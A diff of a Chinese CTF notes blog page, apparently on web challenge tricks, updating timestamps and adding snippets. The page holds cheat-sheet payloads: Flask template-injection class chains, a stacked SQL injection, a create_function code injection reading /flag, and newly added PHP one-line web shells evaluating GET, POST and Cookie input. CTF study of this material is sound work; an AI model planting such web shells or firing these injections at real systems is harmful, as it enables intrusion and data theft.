@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
 <meta property="article:published_time" content="2023-05-08T13:37:40.000Z">
-<meta property="article:modified_time" content="2023-05-27T11:55:24.831Z">
+<meta property="article:modified_time" content="2023-05-29T08:15:17.082Z">
 <meta property="article:author" content="cat">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="php">
@@ -241,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.5k 字
+          9.7k 字
         
       </span>
     
@@ -252,7 +252,7 @@
         
         
         
-          40 分钟
+          41 分钟
         
       </span>
     
@@ -383,7 +383,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2 小时前
+                    本文最后更新于：2 天前
                   
                 
               </p>
@@ -430,7 +430,7 @@
 <h2 id="flask模板注入获取基本类-object">flask模板注入获取基本类 object</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>]<br>&#123;&#125;.__class__.__bases__[<span class="hljs-number">0</span>]<br>().__class__.__base__<br>[].__class__.__base__<br>config.__class__.__base__.__base__<br>request.__class__.__mro__[<span class="hljs-number">9</span>]   //在flask的jinja2模块渲染是可用<br></code></pre></td></tr></table></figure>
 <h2 id="堆叠注入">堆叠注入</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;show tables;handler `table_name` open as flag;handler flag <span class="hljs-built_in">read</span> next;<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">show</span> tables;handler `table_name` <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> flag;handler flag read next;<br></code></pre></td></tr></table></figure>
 <h2 id="a-b"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mo stretchy="false">(</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">a(&#x27;&#x27;,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span>b);</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=\create_function&amp;b=<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;1&#x27;</span>;&#125;var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));/*<br>a=\create_function&amp;b=<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;1&#x27;</span>;&#125;var_dump(file_get_contents(<span class="hljs-string">&#x27;/flag&#x27;</span>));/*<br></code></pre></td></tr></table></figure>
 <h2 id="os-path-join-函数">os.path.join()函数</h2>
@@ -449,6 +449,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">数组整型溢出绕过赋值式“永真”判断：<br>?a=9223372036854775807<br></code></pre></td></tr></table></figure>
 <h2 id="unzip-解压覆盖利用">unzip 解压覆盖利用</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://bbs.kanxue.com/thread-270353.htm<br></code></pre></td></tr></table></figure>
+<h3 id="python-eval">python eval()</h3>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">(open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)</span></span><span class="hljs-selector-class">.read</span>())<br></code></pre></td></tr></table></figure>
+<h2 id="姿势">姿势</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>(<span class="hljs-string">&#x27;1&#x27;</span>));<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>(<span class="hljs-string">&#x27;1&#x27;</span>));<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()[<span class="hljs-string">&#x27;Cookie&#x27;</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
                 
               </div>
             
